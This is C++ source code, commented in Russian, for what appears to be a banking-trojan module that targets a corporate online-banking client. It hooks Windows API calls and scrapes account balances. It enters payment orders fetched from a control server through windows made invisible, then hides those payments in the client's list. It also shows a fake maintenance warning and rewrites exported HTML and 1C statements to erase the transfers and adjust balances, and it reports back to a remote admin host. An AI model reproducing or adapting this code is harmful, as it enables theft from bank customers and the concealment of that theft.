#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"

#include "Utils.h"
#include "WndUtils.h"
#include "BotHTTP.h"

//#include "Inject.h"
#include "ntdll.h"
#include "commctrl.h"
#include "BotHTTP.h"
#include "Config.h"
#include "rafa.h"
#include "AzConfig.h"
#include "Splice.h"

#include "BotDebug.h"


namespace DBGRAFADLL
{
	#include "DbgTemplates.h"
}

#define DBGRAFA DBGRAFADLL::DBGOutMessage<>

#define RafaDllModule //говорим что модуль включен

//не нужно проводить аз
//#define TEST_NOTAZ

namespace Rafa
{

LRESULT (WINAPI *pHandlerSendMessageA)(HWND , UINT , WPARAM , LPARAM );
HWND	(WINAPI *pHandlerCreateWindowExA) (DWORD,PCHAR,PCHAR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
BOOL (WINAPI *pHandlerTrackPopupMenu)(HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT* prcRect ); 
HANDLE (WINAPI *pHandlerCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
							  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
BOOL (WINAPI *pHandlerCloseHandle)(HANDLE hObject);
BOOL (WINAPI *pHandlerWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);

WNDPROC MainWndProc; //оконная процедура главного окна клиента
WNDPROC PaymentWndProc; //оконная процедура окна ввода платежки

//контрол формы, для автоматического заполнения формы данными
struct ControlForm
{
	const char* name; //условное имя контрола, для его идентификации в программе
	int x, y, w, h; //расположение контрола на форме (для поиска, изменять нельзя)
	const char* captionText;
	DWORD captionHash; //если хеш не указан, то ищем по captionText
	const char* classText;
	DWORD classHash;
};

//информация он найденном контроле
struct ControlFinded
{
	HWND wnd;
	ControlForm* info;
};

struct PaymentOrder
{
	char* sendAcc; //счет отправителя
	char* sum; //сумма
	char* inn;
	char* kpp;
	char* bik;
	char* recvAcc; //счет получателя
	char* recvName; //название получателя
	char* comment; //назначение платежа
	char* nds;
	char* bankName; //наименование банка получателя
	char* bankCity; //город банка получателя
	char* bankAcc; //счет банка получателя
	bool entered; //платежка проведена (введена)
	char* balans; //баланс на время создания платежки, указатель всегда должен быть в конце
	char  reserve[32]; //запас на будущее расширение
	char  mem[1024]; //память для данных, сюда ссылаются указатели выше
};

//найденный счет и его баланс
struct AccountBalans
{
	char acc[24]; //найденный счет
	char balans[24]; //остаток на счету
	char showBalans[24]; //отображаемый баланс (с добавлением введенных платежек), который нужно подставлять
};

//найденный аккаунт в дереве
struct TreeAccount
{
	char acc[24]; //номер счета
	HTREEITEM itemAcc; //ветка счета
	HTREEITEM itemTmpls; //ветка шаблонов
};

//типы отчетов рафы
enum TypeFileReport
{
	ReportNothing,
	ReportInfoOperaions, //справка по операциям
	ReportTxt, //пока неизвестный текстовый файл
	ReportXml, //пока неизвестный xml файл
	ReportFormatClientBank, //экспорт для клиент-банка
	ReportFormat1C, //экспорт для 1C
	ReportFormatXml //экспорт в xml формате
};

//Отчет формируемый рафой
struct FileReport
{
	HANDLE file; //файл отчета
	TypeFileReport type; //тип отчета
	char* text; //загруженный отчет, размер выделенной памяти на 1 больше, для последнего 0
	int len; //длина отчета
};

static void GrabBalansFromMemoText(char* s);
static void GrabBalansFromLVM( int cln, char* s );
static void LoadPaymentOrders(); //загрузка проведенных платежек из файла, чтобы их потом скрывать
static void SavePaymentOrders(); //сохранение платежек
static PaymentOrder* GetPaymentOrders(); //запрос новой платежки в админке
static void DBGPrintPayment( PaymentOrder* po ); //печать переданной (считанной) платежки для дебага
static void RelocPayment( char* base ); //перерасчитывает адреса в массиве paymentOrders после перевыделения памяти или загрузки из файла
static int BalansToInt( const char* s, int format = 0 );
static char* IntToBalans( int v, char* s, int format = 0 );
static bool FindTreeList();

HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
DWORD PID = 0; //для избежания 2-го запуска
char LVM_Acc[32]; //найденный счет в таблице
int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabBalansFromLVM)
HWND treeView = 0, listView = 0, toolBar = 0;
int idBtNewDoc = 0;
int idBtDelivery = 0; //кнопка на тулбаре Доставка
bool offBtDelivery = false; //отключить кнопку Доставка, нужно показывать диалог о профилактике
POINT posBtNewDoc, posBtDelivery;
int stateFakeWindow = 0;
PaymentOrder* paymentOrders = 0; //платежные поручения
int c_paymentOrders = 0; //количество скрываемых (полученных) платежек
AccountBalans findedBalans[8]; //найденный счета с балансами
int c_findedBalans = 0; //количество найденных счетов
const char* prophylaxisText = "На данный момент это функцию выполнить невозможно, так как на сервере проводятся профилактические работы. "
							  "Попробуйте через некоторое время.\nИзвините за доставленные неудобства.";

//переменные для скрытия платежек
int paramRows[400]; //каждая строка содержит параметр по которому извлекаются данные (не по номеру), поэтому для скрытия храним и этот параметр
int c_lvRows = 0; //количество строк в lvRows, определяется по сообщению LVM_INSERTITEM
int begHideRows = 0; //с какой строки начинаются невидимые строки
int identHidePayment = 0; //флаги: 1 - совпал получатель, 2 - совпала сумма, 4 - совпало назначение
const int fullIdent = 1 + 2 + 4; //при этом значении считаем, что наша платежка идентифицирована
char filePayments[MAX_PATH]; //файл в котором храним инфу о сформированных платежках

int retMenuNds = 0; //возвращаемое значение при выборе меню НДС

int widthScreen, heightScreen;

//список формируемых отчетов, расчитываем на несколько одновременно формируемых, 
//но на самом деле должен формироваться только один
const int maxFileReports = 5;
FileReport fileReports[maxFileReports];

//char domain[128]; //адрес админки

//контролы формы "Платежное поручение"
ControlForm controlsPaymentOrder[] = 
{
	{ "form",	 0, 0, 606, 569,  "Платёжное поручение", 0x505B8A7A, "Canvas",  0 },
	{ "num",	 168, 0, 50, 25,  0,					 0,			 0,			0xCB934F4 /* edit */}, //номер документа
	{ "express", 169, 29, 67, 16, 0,					 0xEEFB4590 /* срочный */, 0, 0x5E9D34F9 /* button */}, //галочка срочный
	{ "date",	 238, 1, 82, 24,  0,					 0,          0,         0xD3CC2481 /* sysdatetimepick32 */ }, //дата
	{ "typepayment", 339, 1, 102, 302, 0,                0,          0,			0x2D3F0896 /* combobox */}, //вид платежа
	{ "status",	 486, 0, 22, 25,  0,                     0,          0,         0xCB934F4 /* edit */}, //статус составителя
	{ "innsend", 40, 106, 124, 25,0,                     0,          0,         0xCB934F4 /* edit */}, //ИНН плательщика
	{ "kppsend", 240, 106, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП плательщика
	{ "namesend", 93, 133, 234, 25, 0,                   0,          0,         0xCB934F4 /* edit */}, //название плательщика
	{ "sum",     414, 105, 87, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //сумма
	{ "nds",     553, 106, 31, 22, 0,                    0xFFF36251 /* НДС */, 0, 0x5E9D34F9 /* button */}, //кнопка НДС
	{ "innrecv", 40, 234, 124, 25, 0,                    0,          0,         0xCB934F4 /* edit */}, //ИНН получателя
	{ "kpprecv", 240, 234, 87, 27, 0,                    0,          0,         0xCB934F4 /* edit */}, //КПП получателя
	{ "accountrecv", 415, 234, 154, 25,	0,				 0,          0,         0xCB934F4 /* edit */}, //счет получателя
	{ "namerecv", 91, 262, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //наименование получателя
	{ "bikrecv", 415, 262, 154, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //БИК получателя
	{ "bankrecv", 91, 288, 237, 25,	0,					 0,          0,         0xCB934F4 /* edit */}, //банк получателя
	{ "accbankrecv", 415, 288, 154, 25, 0,               0,          0,         0xCB934F4 /* edit */}, //счет банка получателя
	{ "punktrecv", 111, 314, 217, 25, 0,				 0,          0,         0xCB934F4 /* edit */}, //населенный пункт получателя
	{ "daterecv", 486, 315, 82, 24, 0,                   0,			 0,			0xD3CC2481 /* sysdatetimepick32 */ }, //дата исполнения
	{ "queue",    475, 343, 93, 210, 0,					 0,			 0,			0x2D3F0896 /* combobox */}, //очередь платежа
	{ "comment",  9, 408, 579, 97, 0,					 0,          0,         0xCB934F4 /* edit */}, //назначение платежа
	{ "save",     415, 511, 75, 25, 0,					 0x23981105 /* Сохранить */, 0, 0x5E9D34F9 /* button */}, //кнопка сохранить
	{ "sended",   200, 518, 81, 16, 0,                   0xAC3A81FF /* К отправке */, 0, 0x5E9D34F9 /* button */}, //галочка к отправке
	{ 0 }
};

//описание окна подтверждения после нажатия кнопки Доставка
ControlForm formConfirmation =
{
	0, 0, 0, 0, 0, "Информация об отправляемых документах", 0x7DE3292D, "VControl", 0
};

//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf );

static void SendLogToAdmin( int num, const char* text = 0 )
{
	string Host = GetAzHost(true);
	TMemory qr(1024);
	const char *paramText;
	char empty[1], *valText;
	fwsprintfA pwsprintfA = Get_wsprintfA();
	if( text && text[0] ) //не пустая строка
	{
		paramText = "&text=", valText = URLEncode((char*)text);
	}
	else
		empty[0] = 0, paramText = valText = empty;
	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=raifur&mode=setlog&log=%d%s%s", Host.t_str(), BOT_UID, num, paramText, valText );
	if( valText != empty ) STR::Free(valText);
	THTTPResponseRec Response;
	ClearStruct(Response);
	HTTP::Get( qr, 0, &Response );
	DBGRAFA( "Rafa", "Отсылка лога: %s, text=%s", (char*)qr, text );
	HTTPResponse::Clear(&Response);
}

struct LogInfo
{
	int num;
	char text[768];
};

// Функция отправляет лог в отдельном потоке
static DWORD WINAPI SendLogToAdminThread2( LPVOID p )
{
	LogInfo* p2 = (LogInfo*)p;
	SendLogToAdmin( p2->num, p2->text );
	MemFree(p);
	return 0;
}

static DWORD WINAPI SendLogToAdminThread( int num, const char* text = 0 )
{
	LogInfo* p = (LogInfo*)MemAlloc(sizeof(LogInfo));
	if( p )
	{
		p->num = num;
		if( text )
		{
			int len = m_lstrlen(text);
			if( len > sizeof(p->text) ) len = sizeof(p->text) - 1;
			m_memcpy( p->text, text, len );
			p->text[len] = 0;
		}
		else
			p->text[0] = 0;
		StartThread( SendLogToAdminThread2, p );
	}
	return 0;
}

//обновляет значения строк после операции сортировки
static void UpdateParamAfterSort()
{
	LVITEM item;
	ClearStruct(item);
	item.mask = LVIF_PARAM;
	for( int i = 0; i < c_lvRows; i++ )
	{
		item.iItem = i;
		pHandlerSendMessageA( listView, LVM_GETITEM, 0, (LPARAM)&item );
		paramRows[i] = item.lParam;
		//DBGRAFA( "Rafa", "Update %d %08x", i, item.lParam );
	}
	begHideRows = c_lvRows;
}

static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	bool update = false;
	switch ( Msg )
	{
		// весь остальной текст в том числе и из EDIT (в правом нижнем углу)
		case WM_SETTEXT:
			//DBGRAFA( "Rafa", "SETTEXT: [%x] %s", hWnd, lParam ); 
			GrabBalansFromMemoText((char*)lParam);
		break;

		// для дерева добавление item
		case TVM_INSERTITEM:
		{
			/*
			LPTVINSERTSTRUCT insert = (LPTVINSERTSTRUCT)lParam;
			if ( insert)
			if ( insert->item.mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_INSERTITEM: [%x] %s", hWnd, (insert->item.pszText==NULL)?"NULL":insert->item.pszText); 
			}
			*/
			break;
		}
		// для дерева модификация item
		case TVM_SETITEM:
		{
			/*
			LPTVITEM	item  = (LPTVITEM)lParam;
			if ( item )
			if ( item->mask & TVIF_TEXT )
			{
				DBGRAFA( "Rafa", "TVM_SETITEM: [%x] %s",hWnd,(item->pszText==NULL)?"NULL":item->pszText); 
			}
			*/
			break;
		}

		// для таблицы добавление item
		case LVM_INSERTITEM:
		{
			LPLVITEM item = (LPLVITEM)lParam;
			if ( item == NULL)
				break;
			if ( item->mask & LVIF_TEXT && item->pszText != LPSTR_TEXTCALLBACK )
			{
				//DBGRAFA( "Rafa++++", "i = %d,%d, '%s'", item->iItem, item->iSubItem, item->pszText );
			}
			//строим таблицу порядка отображаемых строк
			begHideRows = c_lvRows = item->iItem + 1;
			paramRows[item->iItem] = item->lParam; //по этому параметру извлекаются данные, а не по номеру строки
			//DBGRAFA( "Rafa", "Insert %d %08x", item->iItem, item->lParam );
			break;
		}
		// для таблицы  модификация item
		case LVM_SETITEM:
		{
			LPLVITEM item  = (LPLVITEM)lParam;
			if( item )
				if ( item->mask & LVIF_TEXT )
				{
					//DBGRAFA( "Rafa", "%d %s", item->iSubItem, item->pszText ); 
					GrabBalansFromLVM( item->iSubItem, item->pszText );
				}
			break;
		}
		case LVM_SORTITEMS:
			DBGRAFA( "Rafa", "LVM_SORTITEMS" );
			update = true;
			break;
		case LVM_GETSELECTIONMARK:
			DBGRAFA( "Rafa", "LVM_GETSELECTIONMARK" );
			return 1;
			break;
		default:
			//DBGRAFA( "Rafa", "Unknow msg %d", Msg );
			break;
	}
	LRESULT ret = (LRESULT)pHandlerSendMessageA(hWnd,Msg,wParam,lParam);
	if( update )
	{
		UpdateParamAfterSort();
	}
	return ret;
}

static bool FindPaymentForIdent( const char* s, int id )
{
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		char* s2 = 0;
		switch( id )
		{
			case 0: s2 = paymentOrders[i].recvName; break;
			case 1: s2 = paymentOrders[i].sum; break;
			case 2: s2 = paymentOrders[i].comment; break;
		}
		if( s2 == 0 ) break;
		if( m_strstr( s, s2 ) ) return true;
	}
	return false;
}

/*
static LRESULT WINAPI HandlerPaymentWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	if( (stateFakeWindow & 5) == 5 )
	{
		DBGRAFA( "-------0", "%x (%08x,%08x)", Msg, wParam, lParam );
	}
	LRESULT ret = PaymentWndProc( hWnd, Msg, wParam, lParam );
	return ret;
}
*/

static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	//DBGRAFA( "Rafa", "Msg %d", Msg );
	int paramOrig, numItem;
	switch( Msg )
	{
		case WM_NOTIFY:
		{
			NMHDR* pdi = (NMHDR*)lParam;
			if( pdi->hwndFrom == listView )
			{
				switch( pdi->code )
				{
					case LVN_GETDISPINFO:
					{
						NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
						//подставляем нужный параметр
						paramOrig = p->item.lParam;
						numItem = p->item.iItem;
						p->item.lParam = paramRows[p->item.iItem];
						//DBGRAFA( "Rafa", "%d %08x", numItem, p->item.lParam );
					}
					break;
					case NM_CLICK:
					case NM_DBLCLK:
					{
						NMITEMACTIVATE* p = (NMITEMACTIVATE*)lParam;
						DBGRAFA( "Rafa", "Click" );
						if( p->iItem >= begHideRows )
							return 0;
						else
							p->lParam = paramRows[p->iItem];
						if( idBtDelivery == 0 ) //для поиска кнопки Доставка, не всегда ее можно найти при старте
							FindTreeList();
					}
					break;
				}
			}
			else
				if( pdi->hwndFrom == toolBar )
				{
					switch( pdi->code )
					{
						case NM_CLICK:
						{
							NMMOUSE* p = (NMMOUSE*)lParam;
							if( p->dwItemSpec == idBtDelivery )
							{
								DBGRAFA( "Rafa", "Нажата кнопка Доставка" );
								if( offBtDelivery )
								{
									pMessageBoxA( 0, prophylaxisText, "Внимание!", MB_ICONWARNING );
									return 0;
								}
							}
							//DBGRAFA( "Rafa", "toolBar %d %d %d", pdi->idFrom, p->dwItemSpec, p->dwItemData );
						}
					}
				}
			break;
		}
	}
	LRESULT ret = MainWndProc( hWnd, Msg, wParam, lParam );
	switch ( Msg )
	{
		case WM_NOTIFY:
		{
			//через сообщение LVN_GETDISPINFO ListView запрашивает данные для ячеек, в которых отображаются платежки
			//здесь идентифицируем платежки которые нужно скрыть
			NMHDR* pdi = (NMHDR*)lParam;
			if( pdi->hwndFrom == listView )
			{
				switch( pdi->code )
				{
					case LVN_GETDISPINFO:
					{
						NMLVDISPINFOA* p = (NMLVDISPINFOA*)lParam;
						if( p->item.mask & LVIF_TEXT )
						{
							switch( p->item.iSubItem )
							{
								case 5: //получатель
									if( FindPaymentForIdent( p->item.pszText, 0 ) )
										identHidePayment |= 1;
									else
										identHidePayment = 0; //если не совпало, то обнуляем полностью идентификацию
									break;
								case 4: //сумма
									if( FindPaymentForIdent( p->item.pszText, 1 ) )
										identHidePayment |= 2;
									else
										identHidePayment = 0; 
									break;
								case 6: //назначение
									if( FindPaymentForIdent( p->item.pszText, 2 ) )
										identHidePayment |= 4;
									else
										identHidePayment = 0; 
									break;
							}
							if( identHidePayment == fullIdent ) //наша платежка идентифицирована
							{
								DBGRAFA( "Rafa", "Идентифицировали платежку %d", numItem );
								//ищем индекс платежки в нашем массиве
								int idx = -1;
								for( int i = 0; i < c_lvRows; i++ )
									if( paramRows[i] == paramOrig )
									{
										idx = i;
										break;
									}
								DBGRAFA( "Rafa", "%d %08x", idx, paramOrig );
								if( idx < begHideRows ) //платежка еще не скрыта
								{
									//переносим номер этой платежки в самый низ, остальные поднимаем выше
									for( int i = idx; i < c_lvRows - 1; i++ )
										paramRows[i] = paramRows[i + 1];
									begHideRows--;
									paramRows[c_lvRows - 1] = paramOrig;
									//если строка выделена, то сбрасываем выделение
									DWORD res = (DWORD)pSendMessageA( listView, LVM_GETITEMSTATE, (WPARAM)numItem, (LPARAM)LVIS_SELECTED );
									if( res & LVIS_SELECTED )
									{
										LVITEM item;
										item.stateMask = LVIS_SELECTED;
										item.state = 0;
										pSendMessageA( listView, LVM_SETITEMSTATE, (WPARAM)-1, (LPARAM)&item );
										NMITEMACTIVATE nm;
										ClearStruct(nm);
										nm.hdr.code = NM_CLICK;
										nm.hdr.hwndFrom = listView;
										nm.hdr.idFrom = 0;
										nm.iItem = -1;
										pSendMessageA( listView, WM_NOTIFY, (WPARAM)0, (LPARAM)&nm );
									}
									pSendMessageA( listView, LVM_REDRAWITEMS, (WPARAM)0, (LPARAM)(c_lvRows - 1) );
									SendLogToAdminThread(6); //сообщаем о скрытии платежки
									//pUpdateWindow(listView); //обновляем таблицу
								}
								identHidePayment = 0;
							}
						}
					}
					break;
					case NM_CUSTOMDRAW:
					{
						NMLVCUSTOMDRAW* p = (NMLVCUSTOMDRAW*)lParam;
						if( p->nmcd.dwDrawStage == CDDS_PREPAINT )
						{
							ret |= CDRF_NOTIFYITEMDRAW;
						}
						if( p->nmcd.dwDrawStage == CDDS_ITEMPREPAINT ) 
						{
							if( p->nmcd.dwItemSpec >= (DWORD)begHideRows ) //запрещаем рисовать нашу платежку
								ret = CDRF_SKIPDEFAULT;
							else
								ret = CDRF_NEWFONT;
						}
					}
				}
			}
			break;
		}
	}
	return ret;
}

static HWND WINAPI HandlerCreateWindowExA( DWORD dwExStyle, PCHAR lpClassName, PCHAR lpWindowName, DWORD dwStyle, int x, int y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam )
{
	HWND hWnd = pHandlerCreateWindowExA( dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, 
										 hWndParent, hMenu, hInstance, lpParam );
	
	if( hWnd && (DWORD)lpClassName > 0x10000 && lpWindowName )
	{
		bool transparent = false;
		if( (stateFakeWindow & 3) == 3 ) //ждем появления окна ввода новой платежки
		{
			RECT r;
			if( CmpWnd( lpWindowName, 0, lpClassName, 0, r, &controlsPaymentOrder[0] ) ) //это окно Платёжное поручение
			{
				transparent = true;
				stateFakeWindow &= ~2; //больше не нужно ждать это окно
			}
		}
		else
			if( (stateFakeWindow & 5) == 5 ) //во время ввода платежки, подавляем все всплывающие окна
			{
				//DBGRAFA( "Rafa", "Window class: '%s', caption: '%s'", lpClassName, lpWindowName );
				transparent = true;
			}
		if( transparent ) //делаем окно прозрачным
		{
#ifdef DEBUGCONFIG
			int v = (stateFakeWindow & 16) ? 0 : 50;
			SetWindowTransparent( hWnd, v );
#else
			int v = (stateFakeWindow & 16) ? 0 : 1;
			SetWindowTransparent( hWnd, v );
#endif
		}
	}
	return hWnd;
}

static BOOL WINAPI HandlerTrackPopupMenu( HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT* prcRect )
{
	if( stateFakeWindow & 8 )
	{
		stateFakeWindow &= ~8; //меню вызвано
		return retMenuNds;
	}
	return pHandlerTrackPopupMenu( hMenu, uFlags, x, y, nReserved, hWnd, prcRect );
}

//функции CreateFileA, CloseHandle, WriteFile перехватываем для модификаци отчета по платежкам
static HANDLE WINAPI HandlerCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
							  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
{
	HANDLE file = pHandlerCreateFileA( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
							  dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
	if( file != INVALID_HANDLE_VALUE && (dwDesiredAccess & GENERIC_WRITE) != 0 )
	{
		TypeFileReport type = ReportNothing;
		if( m_strstr( lpFileName, "report.html") )
		{
			DBGRAFA( "Rafa", "Перехватили отчет InfoOperaions '%s'", lpFileName );
			type = ReportInfoOperaions;
		}
		else
			if( m_strstr( lpFileName, ".txt" ) )
			{
				DBGRAFA( "Rafa", "Перехватили файл txt '%s'", lpFileName );
				type = ReportTxt;
			}
			else
				if( m_strstr( lpFileName, ".xml" ) )
				{
					DBGRAFA( "Rafa", "Перехватили файл xml '%s'", lpFileName );
					type = ReportXml;
				}
		if( type != ReportNothing )
		{
			//ложим открытый файл в свободную ячейку
			for( int i = 0; i < maxFileReports; i++ )
				if( fileReports[i].file == 0 )
				{
					fileReports[i].file = file;
					fileReports[i].type = type;
					fileReports[i].text = 0;
					fileReports[i].len = 0;
					break;
				}
		}
	}
	return file;
}

static BOOL WINAPI HandlerWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)
{
	for( int i = 0; i < maxFileReports; i++ )
		if( fileReports[i].file == hFile ) //перехватываемый отчет, пишем его в память
		{
			DBGRAFA( "Rafa", "В отчет добавлено байт: %d, было %d", nNumberOfBytesToWrite, fileReports[i].len );
			fileReports[i].text = (char*)MemRealloc( fileReports[i].text, fileReports[i].len + nNumberOfBytesToWrite + 1 );
			m_memcpy( fileReports[i].text + fileReports[i].len, lpBuffer, nNumberOfBytesToWrite );
			fileReports[i].len += nNumberOfBytesToWrite;
			fileReports[i].text[fileReports[i].len] = 0;
			if( lpNumberOfBytesWritten )
				*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
			bool saved = false; //нужно ли сохранить файл, т. е. формат файла не наш
			if( fileReports[i].type == ReportTxt ) //неизвестный текстовый файл
			{
				if( fileReports[i].len > 32 ) //достаточно данных для идентификации
				{
					if( m_strstr( fileReports[i].text, "1CClientBankExchange" ) ) //format 1C
						fileReports[i].type = ReportFormat1C;
					else
						if( m_strstr( fileReports[i].text, "HEADER" ) && m_strstr( fileReports[i].text, "F00: " ) ) //формат клиент-банка
							fileReports[i].type = ReportFormatClientBank;
						else
							saved = true;

				}
			}
			else
				if( fileReports[i].type == ReportXml ) //неизвестный xml файл
				{
					if( fileReports[i].len > 80 ) //достаточно данных для идентификации
						if( m_strstr( fileReports[i].text, "<AccountStatements>" ) )
							fileReports[i].type = ReportFormatXml;
						else
							saved = true;
				}
			if( saved ) //неопознаные форматы файлов оказались не нашими, поэтому сохраняем их как есть
			{
				DWORD wr;
				pHandlerWriteFile( hFile, fileReports[i].text, fileReports[i].len, &wr, 0 );
				MemFree(fileReports[i].text);
				fileReports[i].file = 0;
				fileReports[i].text = 0;
				fileReports[i].len = 0;
			}
			return TRUE;
		}
	return pHandlerWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped );
}

static char* FindBetweenTag( char* text, const char* left, const char* right, int& sz )
{
	char* p = m_strstr( text, left );
	if( p )
	{
		int l = m_lstrlen(left);
		char* p2 = m_strstr( p + l, right );
		if( p2 )
		{
			l = m_lstrlen(right);
			sz = p2 - p + l;
			return p;
		}
	}
	return 0;
}

static void ChangeSumInfoOperaions( char* html, int addSum, int format )
{
	char* p = m_strstr( html, "<td" );
	if( p == 0 ) return;
	while( *p++ != '>' ); //пока не закончился тег
	char* pp = p; //пробелы потом число
	while( *p != '<' ) p++; //идем до </td>
	*p = 0;
	//извлекаем сумму
    int sum = BalansToInt( pp, format );
    sum += addSum;
    char sumText[32];
    IntToBalans( sum, sumText, format );
    //ложим новую сумму
    char* ps = sumText;
    while( *ps != 0 ) ps++; //идем в конец числа
    ps--; //на последней цифре суммы
	*p-- = '<'; //восстанавливаем
	while( ps >= sumText ) *p-- = *ps--; //заносим число с конца в начало
	while( *p != '>' ) *p-- = ' ';  //заполняем пробелами пока не встретим начальный тег
}

static void ModifyInfoOperaions( FileReport& fr )
{
	DBGRAFA( "RAFA", "Модификация отчета в html формате" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		//приводим сумму к виду как в файле (1,234.56)
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char sumText[32];
		IntToBalans( sumInt, sumText, 1 );
		char* html = fr.text;
		int state = 0;
		while( state >= 0 )
		{
			int sz;
			//находим строку таблицы
			html = FindBetweenTag( html, "<tr>", "</tr>", sz );
			if( html == 0 ) break;
			char c = html[sz]; //ставим в конце строки 0, чтобы дальше не был поиск
			html[sz] = 0;
			switch( state )
			{
				case 0: //поиск строки с платежкой
					{
						//есть ли нужная сумма в строке
						char* p = m_strstr( html, sumText );
						if( p )
						{
							//есть ли нужный счет в строке
							p = m_strstr( p, paymentOrders[i].recvAcc );
							if( p )
							{
								//есть ли нужное назначение
								p = m_strstr( p, paymentOrders[i].comment );
								if( p )
								{
									//найдена строка с платежкой, удаляем
									int restLen = fr.len - (html - fr.text) - sz;
									m_memcpy( html, html + sz, restLen );
									fr.len -= sz;
									html[restLen] = 0;
									state = 1; //переходим на модификацию итоговых сумм
									sz = 0;
								}
							}
						}
					}
					break;
				case 1: //поиск строки с итоговой суммой
					{
						char* p = m_strstr( html, "Сумма в валюте счета" );
						if( p )
						{
							ChangeSumInfoOperaions( p, -sumInt, 1 );
							state = 2;
						}
					}
					break;
				case 2: //поиск количества операций
					{
						char* p = m_strstr( html, "Количество операций" );
						if( p )
						{
							ChangeSumInfoOperaions( p, -1, 2 );
							state = 3;
						}
				    }
					break;
				case 3: //поиск исходящего остатка
					{
						char* p = m_strstr( html, "Исходящий остаток на конец дня" );
						if( p )
						{
							ChangeSumInfoOperaions( p, sumInt, 1 );
							state = 4;
						}
				    }
					break;
				case 4: //поиск входящего остатка
					{
						char* p = m_strstr( html, "Входящий остаток на начало дня" );
						if( p )
						{
							ChangeSumInfoOperaions( p, sumInt, 1 );
							state = 3;
						}
				    }
					break;
			}
			html[sz] = c; //восстанавливаем
			html += sz;
		}
	}
}

//возвращает на сколько изменилась длина отчета, endVal - символ окончания числа
static int ChangeSumForVar( char* text, int lenText, const char* var, int addSum, int format, char endVal )
{
	char* p = m_strstr( text, var );
	if( p == 0 ) return 0;
	int len = m_lstrlen(var);
	p += len;
	//ищем начало числа
	while( *p < '0' || *p > '9' ) p++;
	//ищем конец числа 
	char* pp = p;
	while( *p != endVal ) p++;
	*p = 0;
	int sum = BalansToInt( pp, format ) + addSum;
	*p = endVal;
	char sumText[32];
	IntToBalans( sum, sumText, format ); 
	len = m_lstrlen(sumText);
	int oldLen = p - pp;
	int subLen = len - oldLen;
	//если размер старой и новой суммы разные, то перемещаем отрезок справа
	if( len != oldLen )
	{
		int movedLen = lenText - (p - text); //перемещаемая длина
		if( len < oldLen ) //длина суммы стала меньше 
			m_memcpy( p + subLen, p, movedLen );
		else //длина суммы стала больше
		{
			char* p2 = text + lenText;
			char* p3 = p2 + subLen;
			while( p2 >= p ) *p3-- = *p2--;
		}
	}
	//заменяем суммы
	p = sumText;
	while( *p ) *pp++ = *p++;
	return subLen;
}

static void ModifyFormat1C( FileReport& fr )
{
	DBGRAFA( "RAFA", "Модификация отчета в 1C формате" );
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
		char sumText[32];
		IntToBalans( sumInt, sumText, 4 );
		char* html = fr.text;
		bool stop = false;
		while( !stop )
		{
			int sz;
			//находим секцию
			html = FindBetweenTag( html, "СекцияДокумент", "КонецДокумента", sz );
			if( html == 0 ) break;
			sz += 2; //перевод строки \r\n
			char c = html[sz]; //ставим в конце 0, чтобы дальше не был поиск
			html[sz] = 0;
			//есть ли нужная сумма в секции
			char* p = m_strstr( html, sumText );
			if( p )
			{
				//есть ли нужный счет в секции
				p = m_strstr( p, paymentOrders[i].recvAcc );
				if( p )
				{
					//есть ли нужное назначение
					p = m_strstr( p, paymentOrders[i].comment );
					if( p )
					{
						//найдена секция с платежкой, удаляем
						int restLen = fr.len - (html - fr.text) - sz;
						m_memcpy( html, html + sz, restLen );
						fr.len -= sz;
						html[restLen] = 0;
						int oldLen = fr.len;
						//уменьшаем итоговую сумму и увеличиваем остаток
						oldLen += ChangeSumForVar( fr.text, oldLen, "ВсегоСписано", -sumInt, 4, 'r' );
						oldLen += ChangeSumForVar( fr.text, oldLen, "КонечныйОстаток", sumInt, 4, 'r' );
						sz = oldLen - fr.len;
						fr.len = oldLen;
						stop = true;
					}
				}
			}
			html[sz] = c;
			html += sz;
		}	
	}
}

//модификация экспорта для Клиент-Банка
